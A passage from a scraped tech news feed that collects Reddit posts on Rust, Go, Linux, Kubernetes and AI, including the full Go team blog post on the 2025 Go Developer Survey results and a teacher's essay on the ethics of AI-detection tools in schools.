it mentioned here. Please remember to add a link to the event too.
Email the Rust Community Team for access.I might suspect that if you are lumping all statically-typed languages into a single bucket without making particular distinction among them, then you might not have fully internalized the implications of union (aka Rust enum aka sum) typed data structures combined with exhaustive pattern matching.I like to call it getting "union-pilled" and it's really hard to accept otherwise statically-typed languages once you become familiar.This Week in Rust is edited by:]]></content:encoded></item><item><title>Job Applicants Sue A.I. Recruitment Tool Company. A recently filed lawsuit claims the ratings assigned by A.I. screening software are similar to those of a credit agency and should be subject to the same laws.</title><link>https://www.nytimes.com/2026/01/21/business/ai-hiring-tools-lawsuit-eightfold-fcra.html?unlocked_article_code=1.GFA.9XQK.n_nH_2Z3omQR</link><author>/u/esporx</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 03:52:58 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>MLFS 12.4(musl LFS)</title><link>https://www.reddit.com/r/linux/comments/1qjiei6/mlfs_124musl_lfs/</link><author>/u/Intelligent_Comb_338</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 02:37:53 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Redhat Openshift vs. Suse Rancher Enterprise Support</title><link>https://www.reddit.com/r/kubernetes/comments/1qjhowq/redhat_openshift_vs_suse_rancher_enterprise/</link><author>/u/Open-Ask-1918</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 02:06:39 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Looking for real world feedback from people who have had to utilize the enterprise support offerings from Redhat and Suse for OpenShift and Ranchers on premise solutions.Who do you think provides better support?Iâ€™m looking to create multiple downstream clusters integrated VMWare and want centralized management, monitoring, and deployments. Iâ€™m thinking Rancher is better suited for this purpose but value the feedback of others more experienced and havenâ€™t had a chance to poke around at ACM from Redhat.Also curious about which product you think is better for this job?]]></content:encoded></item><item><title>Human Intelligence, AI, and the Problem I Think We&apos;re Missing</title><link>https://www.reddit.com/r/artificial/comments/1qjfapw/human_intelligence_ai_and_the_problem_i_think/</link><author>/u/tony_24601</author><category>ai</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 00:21:48 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[I can vividly remember teaching my AP English class in 1999 when I first heard of â€œTurnitin.comâ€; my first thought was â€œhow am I going to scan all of these pages into that thing?â€ Back then I graded papers on a first pass with my trusty No. 2 Dixon Ticonderoga pencil. Now what was I going to do?For years I used my pencil as a key aid in the writing process with my students. It was collaborative because we worked together â€“ I would suggest ideas an reframe sentences and thoughts to model writing in line with whatever rubric my assignment called for. Often times students adopted my suggestions whole-cloth, other times we would workshop different stylistic choices. My students and I shared in the rhetorical process. If they chose to use my margin note â€œtry something like this,â€ are they not able to claim ownership because the original words were mine and not theirs?I was the human intelligence that helped guide my students. They took my advice and incorporated it often. Other times they vehemently opposed my suggestions. I was their personal ChatGPT and I enjoyed that work immensely. But it was often brief and temporal, because I only had so much time to visit individually with 75 students. Can we really now castigate a tool that students can have beside them during every moment of their learning journey?The ethical dilemma is this: students could accept, reject, argue with, or ignore me. Today, institutions now assume AI outputs are automatically suspect while often students see them as automatically authoritative. Agency is the key issue. When I suggested phrasing, students exercised their agency to decide whether to adopt or reject my suggestions. My authority was negotiable and if they accepted my suggestions, even verbatim, authorship was never in question.Students are struggling today with teachers making them think AI is a â€œforbidden oracle,â€ whereas teachers are also short-sighted in thinking Turnitin is an infallible detector. The problem is in both cases human judgment is being â€œoutsourced.â€ In 1999, I trusted my students negotiate my (human) guidance; now we pretend that same negotiation between students and AI itself is the problem. What mattered was not that I was always right; but that my authority was provisional.Fast forward almost 30 years and now we not only have a tool for students to generate a decent five-paragraph essay, but a second tool that claims it can detect the use of the first. And that tool is the same one I struggled to understand in 1999: Turnitin. Although this time Turnitin is losing the battle against this newer tool, and students all over academia are suffering from that loss.Academia now is forced to embrace a structure that rewards certainty over caution. Boom: you get the AI-cheating accusation era. Weâ€™re living in a time where a student can be treated like they robbed a bank because a dashboard lit up yellow. Is this how math teachers felt about calculators when they first entered the scene? Can you today imagine any high-level mathematics course that didnâ€™t somehow incorporate this tool? Is ChatGPT the â€œwriting calculatorâ€ that in decades will sit beside every student in an English class along with that No. 2 Dixon Ticonderoga? Or will pencils continue to suffer a slow extinction?Iâ€™m not writing this because I think academic dishonesty is cute. Students absolutely can use AI to outsource thinking, and pretending otherwise is naÃ¯ve. Iâ€™m writing this because the process of accusing students is an ethical problem now. Itâ€™s not just â€œAre people cheating?â€ Itâ€™s â€œWhat evidence counts, who bears the burden, and how much harm are we willing to cause to catch some portion of cases?â€ When a school leans on AI detectors as objective arbiters, the ethics get ugly fast: false positives, biased outcomes, coerced confessions, and a general atmosphere of suspicion that corrodes learning.I believe it is ethically wrong to treat AI-detection scores as dispositive evidence of misconduct; accusations should require due process and corroborating evidence. current detectors are error-prone and easy to game, and the harms of false accusations are severe. If institutions want integrity, they should design integrityâ€”through assessment design, and clear AI-use policies, not outsource judgment to probabilistic software and call it â€œaccountability.â€ MITâ€™s teaching-and-learning guidance says this bluntly: AI detection has high error rates and can lead to false accusations; educators should focus on policy clarity and assessment design instead of policing with detectors. (MIT Sloan Teaching & Learning Technologies).MA in Composition--AI Integrated Writing ]]></content:encoded></item><item><title>I have released dodo pdf reader v0.6.0</title><link>https://github.com/dheerajshenoy/dodo</link><author>/u/dheerajshenoy22</author><category>reddit</category><pubDate>Wed, 21 Jan 2026 23:46:05 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Hello everyone, wanted to share my pdf reader dodo that I have been working for a while. it's based on MuPDF and Qt6. I started developing it because I wanted some niche features that I could not find in others, and also wanted it to be minimal and not reduce screen real-estate.Its still in alpha, I'm open to suggestions, feature requests etc.]]></content:encoded></item><item><title>Substitue for google appcheck and recaptcha</title><link>https://www.reddit.com/r/golang/comments/1qjddvm/substitue_for_google_appcheck_and_recaptcha/</link><author>/u/Select_Day7747</author><category>golang</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 23:04:30 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Hi, so I built an api that uses firebase auth with firebase admin. my choice was because it was what I was most comfortable with and it just works for my scenario where i have react vite front end application and planning on an android app soon as well. my use case currently is that users can access pages on my site unauthenticated and authenticated. my concern is around unauthenticated requests so my solution was to use appcheck through firebase because it was trivial for both frontend and backend. But I feel like this adds some overhead to my requests, ive experienced it when there was slow internet in an area and my api was slow to respond, not the fault of the server but because google took ages to respond.I was wondering if there are any other strategies that I could build in go that could be better suited to replace this? I love Go because it's lightweight, robust and loads of fun to develop. I want to send an extra key in the header to make sure that the source can be trusted.]]></content:encoded></item><item><title>Problemo: Yet another error handling library for Rust</title><link>https://www.reddit.com/r/rust/comments/1qjcus5/problemo_yet_another_error_handling_library_for/</link><author>/u/emblemparade</author><category>rust</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 22:43:42 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[The biggest problem with Rust is that there are not enough error handling libraries... ha!But, seriously, after trying all the popular ones and some of the niche ones in large, complex projects I found myself unsatisfied (and tired). However, the process did help me clarify what my specific needs are and identify common patterns and pain points. So I rolled my own library, and at this point I think it's Good Enoughâ„¢ to share with those who are interested:The main documentation page is quite long, but the point is to explain the goals and solutions as clearly as possible. Towards the end there is a FAQ that will hopefully answer your most burning questions. Also included are examples that showcase some basic and advanced usage.The main differentiator is that Problemo intends not to replace std  but to make working with it easier. It takes a, shall we say, compositional approach to constructing your errors. It also features a rather innovative way to accumulate errors (which you don't have to use).Problemo is deliberately straightforward in its implementation and it should be very easy to understand the code.I hope you would find it interesting even if you decide not to use it. I'm here to answer questions (check the FAQ first, maybe?), hoping you will be kind and constructive.]]></content:encoded></item><item><title>&quot;proposal: spec: type inferred composite literals&quot; has been added to the active column of the proposals project</title><link>https://www.reddit.com/r/golang/comments/1qjbwth/proposal_spec_type_inferred_composite_literals/</link><author>/u/theclapp</author><category>golang</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 22:07:16 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Excerpt from the proposal:Composite literals construct values for structs, arrays, slices, and maps. They consist of a type followed by a brace-bound list of elements. e.g.,x := []string{"a", "b", "c"} I propose adding untyped composite literals, which omit the type. Untyped composite literals are assignable to any composite type. They do not have a default type, and it is an error to use one as the right-hand-side of an assignment where the left-hand-side does not have an explicit type specified.var x []string = {"a", "b", "c"} var m map[string]int = {"a": 1} type T struct { V int } var s []*T = {{0}, {1}, {2}} a := {1, 2, 3} // error: left-hand-type has no type specified Go already allows the elision of the type of a composite literal under certain circumstances. This proposal extends that permission to all occasions when the literal type can be derived.]]></content:encoded></item><item><title>Sysinfo next release needs some help</title><link>https://www.reddit.com/r/rust/comments/1qjbpbx/sysinfo_next_release_needs_some_help/</link><author>/u/imperioland</author><category>rust</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 21:59:42 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[As a reminder, the sysinfo crate gathers System's information such as processes, memory usage, etc.Next sysinfo release is kinda stuck at the moment as I'm trying to get the missing parts for the NetBSD support. Currently I'm missing:If anyone knows how to get the missing information, it'd be awesome!Otherwise, well, I'll just release an incomplete support.]]></content:encoded></item><item><title>Why json/v2 remains experimental in 1.26?</title><link>https://www.reddit.com/r/golang/comments/1qjb1n7/why_jsonv2_remains_experimental_in_126/</link><author>/u/alpako70</author><category>golang</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 21:35:08 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[This is unpleasant surprise. I assume it is still not ready for production. But would appreciate to learn what concerns lead authors to postpone it to later.   submitted by    /u/alpako70 ]]></content:encoded></item><item><title>Results from the 2025 Go Developer Survey</title><link>https://go.dev/blog/survey2025</link><author>/u/Bomgar85</author><category>golang</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 21:29:03 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Hello! In this article weâ€™ll discuss the results of the 2025 Go Developer
Survey, conducted during September 2025.Thank you to the 5,379 Go developers who responded to our survey invitation
this year. Your feedback helps both the Go team at Google and the wider Go
community understand the current state of the Go ecosystem and prioritize
projects for the year ahead.Our three biggest findings are:Broadly speaking, Go developers asked for help with identifying and applying
best practices, making the most of the standard library, and expanding the
language and built-in tooling with more modern capabilities.Most Go developers are now using AI-powered development tools when seeking
information (e.g., learning how to use a module) or toiling (e.g., writing
repetitive blocks of similar code), but their satisfaction with these tools
is middling due, in part, to quality concerns.A surprisingly high proportion of respondents said they frequently need to
review documentation for core  subcommands, including , , and , suggesting meaningful room for improvement with the 
commandâ€™s help system.Read on for the details about these findings, and much more.Most survey respondents self-identified as professional developers (87%) who
use Go for their primary job (82%). A large majority also uses Go for personal
or open-source projects (72%). Most respondents were between 25 â€“ 45
years old (68%) with at least six years of professional development experience
(75%). Going deeper, 81% of respondents told us they had more professional
development experience than Go-specific experience, strong evidence that Go is
usually not the first language developers work with. In fact, one of the
themes that repeatedly surfaced during this yearâ€™s survey analysis seems to
stem from this fact: when the way to do a task in Go is substantially
different from a more familiar language, it creates friction for developers to
first learn the new (to them) idiomatic Go pattern, and then to consistently
recall these differences as they continue to work with multiple languages.
Weâ€™ll return to this theme later.The single most common industry respondents work in was â€œTechnologyâ€ (46%),
but a majority of respondents work outside of the tech industry (54%). We saw
representation of all sizes of organizations, with a bare majority working
somewhere with 2 â€“ 500 employees (51%), 9% working alone, and 30%
working at enterprises of over 1,000 employees. As in prior years, a majority
of responses come from North America and Europe.This year we observed a decrease in the proportion of respondents who said
they were fairly new to Go, having worked with it for less than one year
(13%, vs. 21% in 2024). We suspect this is related to industry-wide
declines in entry-level software engineering roles; we commonly hear from
people that they learned Go for a specific job, so a downturn in hiring would
be expected to reduce the number of developers learning Go in that year. This
hypothesis is further supported by our finding that over 80% of respondents
learned Go  beginning their professional career.Other than the above, we found no significant changes in other demographics
since our 2024 survey.How do people feel about Go?The vast majority of respondents (91%) said they felt satisfied while working
with Go. Almost â…” were â€œvery satisfiedâ€, the highest rating. Both of these
metrics are incredibly positive, and have been stable since we began asking
this question in 2019. The stability over time is really what we monitor from
this metric â€” we view it as a lagging indicator, meaning by the time
this satisfaction metric shows a meaningful change, we would expect to already
have seen earlier signals from issue reports, mailing lists, or other
community feedback.Why were respondents so positive about Go? Looking at open-text responses to
several different survey questions suggests that itâ€™s the gestalt, rather than
any one thing. These folks are telling us that they find tremendous value in
Go as a holistic platform. That doesnâ€™t mean it supports all programming
domains equally well (it surely does not), but that developersâ€™ value the
domains it  nicely support via stdlib and built-in tooling.Below are some representative quotations from respondents. To provide context
for each quote, we also identify the satisfaction level, years of experience
with Go, and industry of the respondent.â€œGo is by far my favorite language; other languages feel far too complex and
unhelpful. The fact that Go is comparatively small, simple, with fewer bells
and whistles plays a massive role in making it such a good long-lasting
foundation for building programs with it. I love that it scales well to
being used by a single programmer and in large teams.â€ â€œThe entire reason I use Go is the great tooling and standard library.  Iâ€™m
very thankful to the team for focusing on great HTTP, crypto, math, sync,
and other tools that make developing service-oriented applications easy and
reliable.â€ â€œ[The] Go ecosystem is the reason why I really like the programming
language. There are a lot of npm issues lately but not with Go.â€ This year we also asked about the other languages that people use. Survey
respondents said that besides Go, they enjoy working with Python, Rust, and
TypeScript, among a long tail of other languages. Some shared characteristics
of these languages align with common points of friction reported by Go
developers, including  areas like error handling, enums, and object-oriented
design patterns. For example, when we sum the proportion of respondents who
said their next-favorite language included one of the following factors, we
found that majorities of respondents enjoy using languages with inheritance,
type-safe enums, and exceptions, with only a bare majority of these languages
including a static type system by default.Proportion of respondentsWe think this is important because it reveals the larger environment in which
developers operate â€” it suggests that people need to use different
design patterns for fairly mundane tasks, depending on the language of the
codebase theyâ€™re currently working on. This leads to additional cognitive load
and confusion, not only among developers new to Go (who must learn idiomatic
Go design patterns), but also among the many developers who work in multiple
codebases or projects. One way to alleviate this additional load is
context-specific guidance, such as a tutorial on â€œError handling in Go for
Java developersâ€. There may even be opportunities to build some of this
guidance into code analyzers, making it easier to surface directly in an IDE.This year we asked the Go community to share their sentiment towards the Go
project itself. These results were quite different from the 91% satisfaction
rate we discussed above, and point to areas the Go Team plans to invest our
energy during 2026. In particular, we want to encourage more contributors to
get involved, and ensure the Go Team accurately understands the challenges Go
developers currently face. We hope this focus, in turn, will help to increase
developer trust in both the Go project and the Go Team leadership. As one
respondent explained the problem:â€œNow that the founding first generation of Go Team members [are] not
involved much anymore in the decision making, I am a bit worried about the
future of Go in terms of quality of maintenance, and its balanced decisions
so far wrt to changes in the language and std lib. More presence in form of
talks [by] the new core team members about the current state and future
plans might be helpful to strengthen trust.â€ What are people building with Go?We revised this list of â€œwhat types of things do you build with Go?â€ from 2024
with the intent of more usefully teasing apart what people are building with
Go, and avoid confusion around evolving terms like â€œagentsâ€. Respondentâ€™s top
use cases remain CLIs and API services, with no meaningful change in either
since 2024. In fact, a majority of respondents (55%) said they build 
CLIs and API services with Go. Over â…“ of respondents specifically build cloud
infrastructure tooling (a new category), and 11% work with ML models, tools,
or agents (an expanded category). Unfortunately embedded use cases were left
off of the revised list, but weâ€™ll fix this for next yearâ€™s survey.Most respondents said they are not currently building AI-powered features into
the Go software they work on (78%), with â…” reporting that their software does
not use AI functionality at all (66%). This appears to be a decrease in
production-related AI usage year-over-year; in 2024, 59% of respondents were
not involved in AI feature work, while 39% indicated some level of
involvement. That marks a shift of 14 points away from building AI-powered
systems among survey respondents, and may reflect some natural pullback from
the early hype around AI-powered applications: itâ€™s plausible that lots of
folks tried to see what they could do with this technology during its initial
rollout, with some proportion deciding against further exploration (at least
at this time).Among respondents who are building AI- or LLM-powered functionality, the most
common use case was to create summaries of existing content (45%). Overall,
however, there was little difference between most uses, with between 28%
â€“ 33% of respondents adding AI functionality to support classification,
generation, solution identification, chatbots, and software development.What are the biggest challenges facing Go developers?One of the most helpful types of feedback we receive from developers are
details about the challenges people run into while working with Go. The Go
Team considers this information holistically and over long time horizons,
because there is often tension between improving Goâ€™s rougher edges and
keeping the language and tooling consistent for developers. Beyond technical
factors, every change also incurs some cost in terms of developer attention
and cognitive disruption. Minimizing disruption may sound a bit dull or
boring, but we view this as an important strength of Go. As Russ Cox wrote in
2023, â€œBoring is goodâ€¦ Boring means being able to focus on your work, not
on whatâ€™s different about Go.â€.In that spirit, this yearâ€™s top challenges are not radically different from
last yearâ€™s. The top three frustrations respondents reported were â€œEnsuring
our Go code follows best practices / Go idiomsâ€ (33% of respondents), â€œA
feature I value from another language isnâ€™t part of Goâ€ (28%), and â€œFinding
trustworthy Go modules and packagesâ€ (26%). We examined open-text responses to
better understand what people meant. Letâ€™s take a minute to dig into each.Respondents who were most frustrated by writing idiomatic Go were often
looking for more official guidance, as well as tooling support to help enforce
this guidance in their codebase. As in prior surveys, questions about how to
structure Go projects were also a common theme. For example:â€œThe simplicity of go helps to read and understand code from other
developers, but there are still some aspects that can differ quite a lot
between programmers. Especially if developers come from other languages,
e.g. Java.â€ â€œMore opinionated way to write go code. Like how to structure a Go project
for services/cli tool.â€ â€œItâ€™s hard to figure out what are good idioms. Especially since the core
team doesnâ€™t keep Effective Go up-to-date.â€ The second major category of frustrations were language features that
developers enjoyed working with in other ecosystems. These open-text comments
largely focused on error handling and reporting patterns, enums and sum types,
nil pointer safety, and general expressivity / verbosity:â€œStill not sure what is the best way to do error handling.â€ â€œRustâ€™s enums are great, and lead to writing great type safe code.â€ â€œThere is nothing (in the compiler) that stops me from using a maybe nil
pointer, or using a value without checking the err first. That should be
[baked into] the type system.â€ â€œI like [Go] but I didnâ€™t expect it to have nil pointer exceptions :)â€ â€œI often find it hard to build abstractions and to provide clear intention
to the future readers of my code.â€ The third major frustration was finding trustworthy Go modules. Respondents
often described two aspects to this problem. One is that they considered many
3rd-party modules to be of marginal quality, making it hard for really good
modules to stand out. The second is identifying which modules are commonly
used and under which types of conditions (including recent trends over time).
These are both problems that could be addressed by showing what weâ€™ll vaguely
call â€œquality signalsâ€ on pkg.go.dev. Respondents provided helpful
explanations of the signals they use to identify trustworthy modules,
including project activity, code quality, recent adoption trends, or the
specific organizations that support or rely upon the module.â€œBeing able to filter by criteria like stable version, number of users and
last update age at pkg.go.dev could make things a bit easier.â€ â€œMany pacakges are just clones/forks or one-off pojects with no
history/maintenance. [sic]â€ â€œMaybe flagging trustworthy packages based on experience, maturity and
community feedback?â€ We agree that these are all areas where the developer experience with Go could
be improved. The challenge, as discussed earlier, is doing so in such a way
that doesnâ€™t lead to breaking changes, increased confusion among Go
developers, or otherwise gets in the way of people trying to get their work
done with Go. Feedback from this survey is a major source of information we
use when discussing proposals, but if youâ€™d like to get involved more directly
or follow along with other contributors, visit the Go proposals on
GitHub;
please be sure to follow this process if
youâ€™d like to add a new proposal.In addition to these (potentially) ecosystem-wide challenges, this year we
also asked specifically about working with the  command. Weâ€™ve informally
heard from developers that this toolâ€™s help system can be confusing to
navigate, but we havenâ€™t had a great sense of how frequently people find
themselves reviewing this documentation.Respondents told us that except for , between 15% â€“ 25% of them
felt they â€œoften needed to review documentationâ€ with working with these
tools. This was surprising, especially for commonly-used subcommands like
 and . Common reasons included remembering specific flags,
understanding what different options do, and navigating the help system
itself. Participants also confirmed that infrequent use was one reason for
frustration, but navigating and parsing command help appears to be the
underlying cause. In other words, we all expect to need to review
documentation sometimes, but we donâ€™t expect to need help navigating the
documentation system itself. As on respondent described their journey:â€œAccessing the help is painful. go test â€“help # didnâ€™t work, but tell[s] me
to type  insteadâ€¦ go help test # oh, actually, the info Iâ€™m
looking for is in  go help testflag # visually parsing through
text that looks all the same without much formattingâ€¦ I just lack time to
dig into this rabbit hole.â€ What does their development environment look like?Operating systems and architecturesGenerally, respondents told us their development platforms are UNIX-like. Most
respondents develop on macOS (60%) or Linux (58%) and deploy to Linux-based
systems, including containers (96%). The largest year-over-year change was
among â€œembedded devices / IoTâ€ deployments, which increased from 2% -> 8% of
respondents; this was the only meaningful change in deployment platforms since
2024.The vast majority of respondents develop on x86-64 or ARM64 architectures,
with a sizable group (25%) still potentially working on 32-bit x86 systems.
However, we believe the wording of this question was confusing to respondents;
next year weâ€™ll clarify the 32-bit vs. 64-bit distinction for each
architecture.Several new code editors have become available in the past two years, and we
expanded our survey question to include the most popular ones. While we saw
some evidence of early adoption, most respondents continued to favor VS
Code (37%) or
GoLand (28%). Of the newer editors, Zed and
Cursor were the highest ranked, each becoming the preferred editor of 4% of
respondents. To put those numbers in context, we looked back at when VS Code
and GoLand were first introduced. VS Code (released in 2015) was favored by
16% of respondents one year after its release. IntelliJ has had a
community-led Go plugin longer than weâ€™ve been surveying Go developers (ðŸ’™),
but if we look at when JetBrains began officially supporting Go in IntelliJ
(2016), within one year IntelliJ was preferred by 20% of respondents.Note: This analysis of code editors does not include respondents who were
referred to the survey directly from VS Code or GoLand.The most common deployment environments for Go continue to be Amazon Web
Services (AWS) at 46% of respondents, company-owned servers (44%), and Google
Cloud Platform (GCP) at 26%. These numbers show minor shifts since 2024, but
nothing statistically significant. We found that the â€œOtherâ€ category
increased to 11% this year, and this was primarily driven by Hetzner (20% of
Other responses); we plan to include Hetzner as a response choice in next
yearâ€™s survey.We also asked respondents about their development experience of working with
different cloud providers. The most common responses, however, showed that
respondents werenâ€™t really sure (46%) or donâ€™t directly interact with public
cloud providers (21%). The biggest driver behind these responses was a theme
weâ€™ve heard often before: with containers, itâ€™s possible to abstract many
details of the cloud environment away from the developer, so that they donâ€™t
meaningfully interact with most provider-specific technologies. This result
suggests that even developers whose work is  to clouds may have
limited experience with the larger suite of tools and technology associated
with each cloud provider. For example:â€œKinda abstract to the platform, Go is very easy to put in a container and
so pretty easy to deploy anywhere: one of its big strength[s].â€ â€œThe cloud provider really doesnâ€™t make much difference to me. I write code
and deploy it to containers, so whether thatâ€™s AWS or GCP I donâ€™t really
care.â€ We suspect this level of abstraction is dependant on the use case and
requirements of the service thatâ€™s being deployed â€” it may not always
make sense or be possible to keep it highly abstracted. In the future, we plan
to further investigate how Go developers tend to interact with the platforms
where their software is ultimately deployed.Finally, we canâ€™t discuss development environments in 2025 without also
mentioning AI-powered software development tools. Our survey suggests
bifurcated adoption â€” while a majority of respondents (53%) said they
use such tools daily, there is also a large group (29%) who do not use these
at all, or only used them a few times during the past month. We expected this
to negatively correlate with age or development experience, but were unable to
find strong evidence supporting this theory except for  new developers:
respondents with less than one year of professional development experience
(not specific to Go) did report more AI use than every other cohort, but this
group only represented 2% of survey respondents.At this time, agentic use of AI-powered tools appears nascent among Go
developers, with only 17% of respondents saying this is their primary way of
using such tools, though a larger group (40%) are occasionally trying agentic
modes of operation.The most commonly used AI assistants remain ChatGPT, GitHub Copilot, and
Claude. Most of these agents show lower usage numbers compared with our 2024
survey (Claude and Cursor are
notable exceptions), but due to a methodology change, this is not an
apples-to-apples comparison. It is, however, plausible that developers are
â€œshopping aroundâ€ less than they were when these tools were first released,
resulting in more people using a single assistant for most of their work.We also asked about overall satisfaction with AI-powered development tools. A
majority (55%) reported being satisfied, but this was heavily weighted towards
the â€œSomewhat satisfiedâ€ category (42%) vs. the â€œVery satisfiedâ€ group (13%).
Recall that Go itself consistently shows a 90%+ satisfaction rate each year;
this year, 62% of respondents said they are â€œVery satisfiedâ€ with Go. We add
this context to show that while AI-powered tooling is starting to see adoption
and finding some successful use cases, developer sentiment  towards them
remains much softer than towards more established tooling (among Go
developers, at least).What is driving this lower rate of satisfaction? In a word: quality. We asked
respondents to tell us something good theyâ€™ve accomplished with these tools,
as well as something that didnâ€™t work out well. A majority said that creating
non-functional code was their primary problem with AI developer tools (53%),
with 30% lamenting that even working code was of poor quality. The most
frequently cited benefits, conversely, were generating unit tests, writing
boilerplate code, enhanced autocompletion, refactoring, and documentation
generation. These appear to be cases where code quality is perceived as less
critical, tipping the balance in favor of letting AI take the first pass at a
task. That said, respondents also told us the AI-generated code in these
successful cases still required careful review (and often, corrections), as it
can be buggy, insecure, or lack context.â€œIâ€™m never satisfied with code quality or consistency, it never follows the
practices I want to.â€ â€œAll AI tools tend to hallucinate quickly when working with medium-to-large
codebases (10k+ lines of code). They can explain code effectively but
struggle to generate new, complex featuresâ€ â€œDespite numerous efforts to make it write code in an established codebase,
it would take too much effort to steer it to follow the practices in the
project, and it would add subtle behaviour paths - i.e. if it would miss
some method it would try to find its way around it or rely on some side
effect. Sometimes those things are hard to recognize during code review. I
also found it mentally taxing to review ai generated code and that overhead
kills the productivity potential in writing code.â€ When we asked developers what they used these tools for, a pattern emerged
that is consistent with these quality concerns. The tasks with most adoption
(green in the chart below) and least resistance (red) deal with bridging
knowledge gaps, improving local code, and avoiding toil. The frustrations that
developers talk about with code-generating tools were much less evident when
theyâ€™re seeking information, like how to use a specific API or configure test
coverage, and perhaps as a result, we see higher usage of AI in these areas.
Another spot that stood out was  code review and related suggestions
â€” people were less interested in using AI to review other peopleâ€™s code
than in reviewing their own. Surprisingly, â€œtesting codeâ€ showed lower AI
adoption than other toilsome tasks, though we donâ€™t yet have strong
understanding of why.Of all the tasks we asked about, â€œWriting codeâ€ was the most bifurcated, with
66% of respondents already or hoping to soon use AI for this, while Â¼ of
respondents didnâ€™t want AI involved at all. Open-ended responses suggest
developers primarily use this for toilsome, repetitive code, and continue to
have concerns about the quality of AI-generated code.Once again, a tremendous thank-you to everyone who responded to this yearâ€™s Go
Developer Survey!We plan to share the raw survey dataset in Q1 2026, so the larger community
can also explore the data underlying these findings. This will only include
responses from people who opted in to share this data (82% of all
respondents), so there may be some differences from the numbers we reference
in this post.This survey was conducted between Sept 9 - Sept 30, 2025. Participants were
publicly invited to respond via the Go Blog, invitations on social media
channels (including Bluesky, Mastodon, Reddit, and X), as well as randomized
in-product invitations to people using VS Code and GoLand to write Go
software. We received a total of 7,070 responses. After data cleaning to
remove bots and other very low quality responses, 5,379 were used for the
remainder of our analysis. The median survey response time was between 12
â€“ 13 minutes.Throughout this report we use charts of survey responses to provide supporting
evidence for our findings. All of these charts use a similar format. The title
is the exact question that survey respondents saw. Unless otherwise noted,
questions were multiple choice and participants could only select a single
response choice; each chartâ€™s subtitle will tell the reader if the question
allowed multiple response choices or was an open-ended text box instead of a
multiple choice question. For charts of open-ended text responses, a Go team
member read and manually categorized all of the responses. Many open-ended
questions elicited a wide variety of responses; to keep the chart sizes
reasonable, we condensed them to a maximum of the top 10-12 themes, with
additional themes all grouped under â€œOtherâ€. The percentage labels shown in
charts are rounded to the nearest integer (e.g., 1.4% and 0.8% will both be
displayed as 1%), but the length of each bar and row ordering are based on the
unrounded values.To help readers understand the weight of evidence underlying each finding, we
included error bars showing the 95% confidence
interval for responses;
narrower bars indicate increased confidence. Sometimes two or more responses
have overlapping error bars, which means the relative order of those responses
is not statistically meaningful (i.e., the responses are effectively tied).
The lower right of each chart shows the number of people whose responses are
included in the chart, in the form â€œn = [number of respondents]â€.]]></content:encoded></item><item><title>Is agentless container security effective for Kubernetes workloads at scale?</title><link>https://www.reddit.com/r/kubernetes/comments/1qja0wg/is_agentless_container_security_effective_for/</link><author>/u/amylanky</author><category>reddit</category><pubDate>Wed, 21 Jan 2026 20:57:34 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[We're running hundreds of Kubernetes workloads across multiple clusters, and the idea of deploying agents into every container feels unsustainable. Performance overhead, image bloat, and operational complexity are all concerns.Is agentless container security actually viable, or is it just marketing? anyone actually secured container workloads at scale without embedding agents everywhere?]]></content:encoded></item><item><title>What are the top 5 safe, high-paying jobs that AI is unlikely to replace over the next few decades?</title><link>https://www.reddit.com/r/artificial/comments/1qj91oh/what_are_the_top_5_safe_highpaying_jobs_that_ai/</link><author>/u/Curious_Suchit</author><category>ai</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 20:21:15 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[As AI continues to automate routine and analytical tasks, many roles will evolve or disappear. This raises an important question about which careers can offer long-term security, meaningful work, and strong earning potential in an AI-driven world]]></content:encoded></item><item><title>The NexPhone is an upcoming phone that can boot desktop Linux along with Android (and Microslop Windows 11) - made for USB-C docking to monitors</title><link>https://nexphone.com/</link><author>/u/HiGuysImNewToReddit</author><category>reddit</category><pubDate>Wed, 21 Jan 2026 19:55:34 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Backpressure Patterns in Go: From Channels to Queues to Load 